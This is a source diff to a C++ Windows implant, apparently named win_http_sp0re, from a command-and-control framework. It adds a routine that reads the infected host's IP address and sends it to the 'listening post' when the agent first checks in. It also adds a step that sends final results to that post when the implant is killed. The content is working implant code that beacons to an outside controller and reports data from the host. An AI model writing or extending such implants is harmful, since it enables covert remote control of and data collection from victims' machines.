@@ -23,11 +23,52 @@
 #include <boost/property_tree/ptree.hpp>
 
 #include <cpr/cpr.h>
+#include <winsock2.h>
+#include <iphlpapi.h>
+#include <stdio.h>
+#include <stdlib.h>
+#pragma comment(lib, "IPHLPAPI.lib")
 
 #include <nlohmann/json.hpp>
 
+#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
+#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
+
 using json = nlohmann::json;
 
+// Function to return the ip address
+std::string getIPAddr() {
+    PIP_ADAPTER_INFO pAdapterInfo;
+    PIP_ADAPTER_INFO pAdapter = NULL;
+    DWORD dwRetVal = 0;
+
+    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
+    pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
+    if (pAdapterInfo == NULL) {
+        return "Error allocating memory needed to call GetAdaptersinfo";
+    }
+    // Make an initial call to GetAdaptersInfo to get
+    // the necessary size into the ulOutBufLen variable
+    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
+        FREE(pAdapterInfo);
+        pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
+        if (pAdapterInfo == NULL) {
+            return "Error allocating memory needed to call GetAdaptersinfo";
+        }
+    }
+    if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
+        pAdapter = pAdapterInfo;
+        std::string ipaddr = pAdapter->IpAddressList.IpAddress.String;
+        if (pAdapterInfo)
+            FREE(pAdapterInfo);
+        return ipaddr;
+    }
+    else {
+        if (pAdapterInfo)
+            FREE(pAdapterInfo);
+        return "GetAdaptersInfo failed with error: " + dwRetVal;
+    }
+}
 
 // Function to send an asynchronous HTTP POST request with a payload to the listening post
 [[nodiscard]] std::string sendHttpRequest(std::string_view host,
@@ -116,6 +157,9 @@ void Implant::beacon() {
         if (agent_id == "MA==") { std::this_thread::sleep_for(std::chrono::seconds{2}); }
         std::this_thread::sleep_for(sleepTimeChrono);
     }
+    std::cout << "win_http_sp0re has been killed. Sending final results back to listening post...\n";
+    std::this_thread::sleep_for(std::chrono::seconds{ 1 });
+    const auto serverResponse = sendResults();
 }
 
 
@@ -131,6 +175,9 @@ void Implant::beacon() {
     // Format result contents
     std::stringstream resultsStringStream;
     resultsLocal.add("agent_id", agent_id);
+    if (agent_id == "MA==") {
+        resultsLocal.add("ip_address", getIPAddr());
+    }
     boost::property_tree::write_json(resultsStringStream, resultsLocal);
     // Contact listening post with results and return any tasks received
     return sendHttpRequest(host, port, uri, resultsStringStream.str());
